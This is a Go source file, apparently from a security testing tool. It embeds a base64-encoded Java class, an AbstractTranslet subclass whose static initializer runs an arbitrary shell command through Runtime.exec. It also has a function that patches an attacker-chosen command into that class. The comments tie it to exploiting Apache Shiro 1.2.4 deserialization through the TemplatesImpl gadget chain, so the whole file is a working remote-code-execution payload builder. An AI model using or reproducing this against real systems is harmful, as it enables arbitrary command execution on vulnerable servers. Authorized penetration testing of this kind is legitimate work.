package engine

import (
	"encoding/base64"
	"errors"
	"fmt"

	javaclassparser "github.com/yaklang/javajive/classparser"
)

// runtimeExecTransletBase64 is compiled from
// testdata/RuntimeExecTranslet.java with Java 8 target bytecode. Yaklang's
// generic RuntimeExec class template does not implement AbstractTranslet's
// transform methods, so TemplatesImpl rejects it on the Shiro 1.2.4 Java 8
// lab before the static initializer can run.
const runtimeExecTransletBase64 = "yv66vgAAADQAPQoADwAgCAAhCQAiACMIACQKAAYAJQcAJggAJwgAKAgAKQgAKgoAKwAsCgArAC0HAC4HAC8HADABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAKRXhjZXB0aW9ucwcAMQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACYHADIHAC4BAApTb3VyY2VGaWxlAQAYUnVudGltZUV4ZWNUcmFuc2xldC5qYXZhDAAQABEBAAd7e2NtZH19BwAzDAA0ADUBAAEvDAA2ADcBABBqYXZhL2xhbmcvU3RyaW5nAQAHL2Jpbi9zaAEAAi1jAQADY21kAQACL0MHADgMADkAOgwAOwA8AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAG3BheWxvYWQvUnVudGltZUV4ZWNUcmFuc2xldAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNbTGphdmEvbGFuZy9TdHJpbmc7AQAMamF2YS9pby9GaWxlAQAJc2VwYXJhdG9yAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAOAA8AAAAAAAQAAQAQABEAAQASAAAAHQABAAEAAAAFKrcAAbEAAAABABMAAAAGAAEAAAAQAAEAFAAVAAIAEgAAABkAAAADAAAAAbEAAAABABMAAAAGAAEAAAAiABYAAAAEAAEAFwABABQAGAACABIAAAAZAAAABAAAAAGxAAAAAQATAAAABgABAAAAJgAWAAAABAABABcACAAZABEAAQASAAAAmwAEAAMAAABEEgJLsgADEgS2AAWZABkGvQAGWQMSB1NZBBIIU1kFKlNMpwAWBr0ABlkDEglTWQQSClNZBSpTTLgACyu2AAxXpwAETbEAAQA3AD8AQgANAAIAEwAAACIACAAAABIAAwAUAA4AFQAkABcANwAaAD8AHQBCABsAQwAeABoAAAAVAAT8ACQHABv8ABIHABxKBwAd+QAAAAEAHgAAAAIAHw=="

func runtimeExecTransletBytes(command string) ([]byte, error) {
	if len(command) > maxYSOCommandBytes {
		return nil, fmt.Errorf("YSO command exceeds %d bytes", maxYSOCommandBytes)
	}
	template, err := base64.StdEncoding.DecodeString(runtimeExecTransletBase64)
	if err != nil {
		return nil, fmt.Errorf("decode RuntimeExec translet template: %w", err)
	}
	object, err := javaclassparser.Parse(template)
	if err != nil {
		return nil, fmt.Errorf("parse RuntimeExec translet template: %w", err)
	}
	builder := javaclassparser.NewClassObjectBuilder(object)
	builder.SetParam("cmd", command)
	if buildErrors := builder.GetErrors(); len(buildErrors) > 0 {
		return nil, fmt.Errorf("patch RuntimeExec translet command: %w", errors.Join(buildErrors...))
	}
	result := builder.GetObject().Bytes()
	if len(result) > maxYSOBytes {
		return nil, fmt.Errorf("RuntimeExec translet exceeds %d bytes", maxYSOBytes)
	}
	return result, nil
}
